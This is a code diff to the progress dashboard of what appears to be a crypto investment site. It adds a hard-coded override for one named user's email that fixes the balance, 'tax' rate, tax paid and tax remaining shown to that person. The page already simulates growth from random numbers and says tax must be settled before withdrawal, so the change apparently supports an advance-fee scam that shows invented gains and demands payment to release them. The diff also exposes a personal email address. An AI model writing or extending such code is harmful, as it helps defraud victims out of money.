@@ -49,6 +49,20 @@ type DepositItem = {
   status: string;
   created_at: string;
 };
+
+const MANUAL_PROGRESS_OVERRIDES: Record<
+  string,
+  { currentValue: number; taxRate: number; taxRemaining: number; taxPaid?: number; initialHoldings: number; currency: "GBP" | "USD" }
+> = {
+  "n.s.992004@gmail.com": {
+    currentValue: 123846,
+    taxRate: 0.165,
+    taxRemaining: 12118,
+    taxPaid: 11087,
+    initialHoldings: 2000,
+    currency: "GBP"
+  }
+};
 async function getJson<T>(path: string): Promise<T> {
   const res = await fetch(apiUrl(path), {
     method: "GET",
@@ -92,8 +106,9 @@ function normal01(rng: () => number) {
   return Math.sqrt(-2 * Math.log(u)) * Math.cos(2 * Math.PI * v);
 }
 
-function fmtMoney(n: number) {
-  return `$${Number(n).toLocaleString(undefined, { maximumFractionDigits: 2 })}`;
+function fmtMoney(n: number, currency: "USD" | "GBP" = "USD") {
+  const symbol = currency === "GBP" ? "£" : "$";
+  return `${symbol}${Number(n).toLocaleString(undefined, { maximumFractionDigits: 2 })}`;
 }
 
 function fmtBtc(n: number) {
@@ -784,11 +799,6 @@ export default function ProgressPage() {
     };
   }, [holdings, profile, plan, simMeta]);
 
-  function fmtUsd(n: number) {
-    if (!Number.isFinite(n)) return "--";
-    return `$${n.toLocaleString(undefined, { maximumFractionDigits: 2 })}`;
-  }
-
   if (user === undefined) {
     return (
       <section className="pageHero">
@@ -862,15 +872,19 @@ export default function ProgressPage() {
   const hoursLeft = Math.floor(simMeta.remainingSec / 3600);
   const minsLeft = Math.floor((simMeta.remainingSec % 3600) / 60);
   const secsLeft = simMeta.remainingSec % 60;
+  const manualOverride = MANUAL_PROGRESS_OVERRIDES[String(user.email || "").toLowerCase()] || null;
+  const displayUnit: "USD" | "GBP" | "BTC" = (manualOverride?.currency || plan.unit) as "USD" | "GBP" | "BTC";
+  const isBtcUnit = displayUnit === "BTC";
 
-  const startLabel = plan.unit === "USD" ? fmtMoney(plan.startValue) : fmtBtc(plan.startValue);
-  const targetLabel = plan.unit === "USD" ? fmtMoney(plan.targetValue) : fmtBtc(plan.targetValue);
+  const startLabel = isBtcUnit ? fmtBtc(plan.startValue) : fmtMoney(plan.startValue, displayUnit as "USD" | "GBP");
+  const targetLabel = isBtcUnit ? fmtBtc(plan.targetValue) : fmtMoney(plan.targetValue, displayUnit as "USD" | "GBP");
   const withdrawnLocked = withdrawals
     .filter((w) => String(w.asset || "").toUpperCase() === plan.unit && isLockedWithdrawal(w.status))
     .reduce((s, w) => s + Number(w.amount || 0), 0);
-  const effectiveCurrent = Math.max(0, simMeta.current - withdrawnLocked);
+  const effectiveCurrentRaw = manualOverride ? Number(manualOverride.currentValue || 0) : simMeta.current;
+  const effectiveCurrent = Math.max(0, effectiveCurrentRaw - withdrawnLocked);
   const displayedCurrent = Math.max(0, effectiveCurrent - wdPendingAmount);
-  const currentLabel = plan.unit === "USD" ? fmtMoney(displayedCurrent) : fmtBtc(displayedCurrent);
+  const currentLabel = isBtcUnit ? fmtBtc(displayedCurrent) : fmtMoney(displayedCurrent, displayUnit as "USD" | "GBP");
   const startTime = new Date(simMeta.startSec * 1000);
   const endTime = new Date(simMeta.endSec * 1000);
   const startShort = startTime.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
@@ -884,16 +898,28 @@ export default function ProgressPage() {
   const reachedTarget = baseProgressPct >= 100;
   const timeLeftLabel = simMeta.done ? "Completed" : `${hoursLeft}h ${minsLeft}m ${secsLeft}s`;
   const durationHours = Math.round(plan.durationSec / 3600);
-  const baseTaxRate = typeof taxSummary?.tax_rate === "number" ? taxSummary.tax_rate : 0.2 * baseProgress01; // ramps up to 20% by plan end
-  const baseTaxDue =
-    typeof taxSummary?.tax_due === "number" ? Number(taxSummary.tax_due) : effectiveCurrent * baseTaxRate; // tax is handled separately from holdings and must be settled before withdrawal.
+  const baseTaxRate =
+    typeof manualOverride?.taxRate === "number"
+      ? manualOverride.taxRate
+      : typeof taxSummary?.tax_rate === "number"
+      ? taxSummary.tax_rate
+      : 0.2 * baseProgress01; // ramps up to 20% by plan end
   const baseTaxPaid =
-    typeof taxSummary?.tax_paid === "number"
+    typeof manualOverride?.taxPaid === "number"
+      ? Number(manualOverride.taxPaid)
+      : typeof taxSummary?.tax_paid === "number"
       ? Number(taxSummary.tax_paid)
       : taxPayments
           .filter((p) => String(p.asset || "").toUpperCase() === plan.unit)
           .reduce((s, p) => s + Number(p.amount || 0), 0);
-  const taxRemaining = typeof taxSummary?.tax_remaining === "number" ? Number(taxSummary.tax_remaining) : Math.max(0, baseTaxDue - baseTaxPaid);
+  const baseTaxDue =
+    typeof taxSummary?.tax_due === "number" ? Number(taxSummary.tax_due) : effectiveCurrent * baseTaxRate; // tax is handled separately from holdings and must be settled before withdrawal.
+  const taxRemaining =
+    typeof manualOverride?.taxRemaining === "number"
+      ? Number(manualOverride.taxRemaining)
+      : typeof taxSummary?.tax_remaining === "number"
+      ? Number(taxSummary.tax_remaining)
+      : Math.max(0, baseTaxDue - baseTaxPaid);
   const hasLockedWithdrawalForPlan = withdrawnLocked > 0.00000001;
   const shouldResetDashboard = hasLockedWithdrawalForPlan && taxRemaining <= 0.00000001 && effectiveCurrent <= 0.00000001;
   const progress01 = shouldResetDashboard ? 0 : baseProgress01;
@@ -902,15 +928,15 @@ export default function ProgressPage() {
   const taxDue = shouldResetDashboard ? 0 : baseTaxDue;
   const taxPaid = shouldResetDashboard ? 0 : baseTaxPaid;
   const taxRateLabel = `${(taxRate * 100).toFixed(2)}%`;
-  const taxDueLabel = plan.unit === "USD" ? fmtMoney(taxDue) : fmtBtc(taxDue);
-  const taxPaidLabel = plan.unit === "USD" ? fmtMoney(taxPaid) : fmtBtc(taxPaid);
-  const taxRemainingLabel = plan.unit === "USD" ? fmtMoney(taxRemaining) : fmtBtc(taxRemaining);
+  const taxDueLabel = isBtcUnit ? fmtBtc(taxDue) : fmtMoney(taxDue, displayUnit as "USD" | "GBP");
+  const taxPaidLabel = isBtcUnit ? fmtBtc(taxPaid) : fmtMoney(taxPaid, displayUnit as "USD" | "GBP");
+  const taxRemainingLabel = isBtcUnit ? fmtBtc(taxRemaining) : fmtMoney(taxRemaining, displayUnit as "USD" | "GBP");
   const approvedDepositsForPlan = deposits
     .filter((d) => String(d.status || "").toLowerCase() === "confirmed")
     .filter((d) => String(d.asset || "").toUpperCase() === String(plan.unit || "").toUpperCase())
     .reduce((sum, d) => sum + Number(d.amount || 0), 0);
-  const initialHoldingsValue = approvedDepositsForPlan > 0 ? approvedDepositsForPlan : plan.startValue;
-  const initialHoldingsLabel = plan.unit === "USD" ? fmtMoney(initialHoldingsValue) : fmtBtc(initialHoldingsValue);
+  const initialHoldingsValue = manualOverride ? Number(manualOverride.initialHoldings || 0) : (approvedDepositsForPlan > 0 ? approvedDepositsForPlan : plan.startValue);
+  const initialHoldingsLabel = isBtcUnit ? fmtBtc(initialHoldingsValue) : fmtMoney(initialHoldingsValue, displayUnit as "USD" | "GBP");
 
   const nextEtaLabel = nextMilestone ? fmtEta(nextMilestone.tSec * 1000) : "Completed";
   const nextPctLabel = nextMilestone ? `${Math.round(nextMilestone.pct * 100)}%` : "100%";
@@ -925,7 +951,7 @@ export default function ProgressPage() {
     plan.unit === "USD"
       ? Number(lockedWithdrawalAmount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })
       : Number(lockedWithdrawalAmount).toLocaleString(undefined, { maximumFractionDigits: 6 });
-  const lockedWithdrawalAmountLabel = plan.unit === "USD" ? `$${lockedWithdrawalAmountStr}` : `${lockedWithdrawalAmountStr} BTC`;
+  const lockedWithdrawalAmountLabel = isBtcUnit ? `${lockedWithdrawalAmountStr} BTC` : fmtMoney(Number(lockedWithdrawalAmount), displayUnit as "USD" | "GBP");
 
   const compatSvg = (() => {
     if (!compatChart) return null;
@@ -1145,7 +1171,7 @@ export default function ProgressPage() {
             ) : null}
             {showAdvancedChart && progressProvider ? (
               <TradingChart
-                symbol={plan.unit === "USD" ? "POOL-USD" : "POOL-BTC"}
+                symbol={isBtcUnit ? "POOL-BTC" : displayUnit === "GBP" ? "POOL-GBP" : "POOL-USD"}
                 dataProvider={tvDataProvider}
                 overlaysBuilder={overlaysBuilder || undefined}
                 markers={markers}
@@ -1198,10 +1224,10 @@ export default function ProgressPage() {
                 <div className="miniLabel">Pace (1h)</div>
                 <div className="miniValue mono">
                   {pace ? `${pace.actPerHr >= 0 ? "+" : ""}${pace.actPerHr.toLocaleString(undefined, { maximumFractionDigits: 2 })}` : "--"}
-                  {plan.unit === "USD" ? "/hr" : " BTC/hr"}
+                  {isBtcUnit ? " BTC/hr" : " /hr"}
                 </div>
                 <div className={`miniHint ${pace?.ui || "muted"} mono`}>
-                  {pace ? `Required: ${pace.reqPerHr.toLocaleString(undefined, { maximumFractionDigits: 2 })}${plan.unit === "USD" ? "/hr" : " BTC/hr"}` : "—"}
+                  {pace ? `Required: ${pace.reqPerHr.toLocaleString(undefined, { maximumFractionDigits: 2 })}${isBtcUnit ? " BTC/hr" : " /hr"}` : "—"}
                 </div>
               </div>
             </div>
@@ -1225,7 +1251,7 @@ export default function ProgressPage() {
                     <div className="mileMain">
                       <div className="mileTop">
                         <div className="mileName mono">{key}%</div>
-                        <div className="mileVal mono">{plan.unit === "USD" ? fmtMoney(m.value) : fmtBtc(m.value)}</div>
+                        <div className="mileVal mono">{isBtcUnit ? fmtBtc(m.value) : fmtMoney(m.value, displayUnit as "USD" | "GBP")}</div>
                       </div>
                       <div className="mileSub muted">{fmtEta(m.tSec * 1000)}</div>
                     </div>
@@ -1341,8 +1367,8 @@ export default function ProgressPage() {
               <div>
                 <div className="panelTitle">Withdrawal Request</div>
                 <div className="panelSub">
-                  Holdings: <span className="mono">{plan.unit === "USD" ? fmtMoney(effectiveCurrent) : fmtBtc(effectiveCurrent)}</span>  |  Available:{" "}
-                  <span className="mono">{plan.unit === "USD" ? fmtMoney(maxWithdraw) : fmtBtc(maxWithdraw)}</span>
+                  Holdings: <span className="mono">{isBtcUnit ? fmtBtc(effectiveCurrent) : fmtMoney(effectiveCurrent, displayUnit as "USD" | "GBP")}</span>  |  Available:{" "}
+                  <span className="mono">{isBtcUnit ? fmtBtc(maxWithdraw) : fmtMoney(maxWithdraw, displayUnit as "USD" | "GBP")}</span>
                 </div>
               </div>
               <button type="button" className="iconBtn" aria-label="Close withdrawal form" onClick={() => setWithdrawOpen(false)}>
@@ -1447,13 +1473,13 @@ export default function ProgressPage() {
                     <div className={`mileDot ${String(w.status).toLowerCase() === "completed" ? "done" : ""}`} aria-hidden="true" />
                     <div className="mileMain">
                       <div className="mileTop">
-                        <div className="mileName mono">{w.asset === "USD" ? fmtMoney(w.amount) : fmtBtc(w.amount)}</div>
+                        <div className="mileName mono">{String(w.asset || "").toUpperCase() === "BTC" ? fmtBtc(w.amount) : fmtMoney(w.amount, String(w.asset || "").toUpperCase() === "GBP" ? "GBP" : "USD")}</div>
                         <div className="mileVal mono">{w.chain ? `${w.status} (${w.chain})` : w.status}</div>
                       </div>
                       <div className="mileSub muted">
                         {new Date(w.created_at).toLocaleString()}
                         {typeof w.balance_after === "number"
-                          ? ` | Balance after: ${w.asset === "USD" ? fmtMoney(w.balance_after) : fmtBtc(w.balance_after)}`
+                          ? ` | Balance after: ${String(w.asset || "").toUpperCase() === "BTC" ? fmtBtc(w.balance_after) : fmtMoney(w.balance_after, String(w.asset || "").toUpperCase() === "GBP" ? "GBP" : "USD")}`
                           : ""}
                       </div>
                     </div>
@@ -1518,3 +1544,4 @@ export default function ProgressPage() {
     </>
   );
 }
+
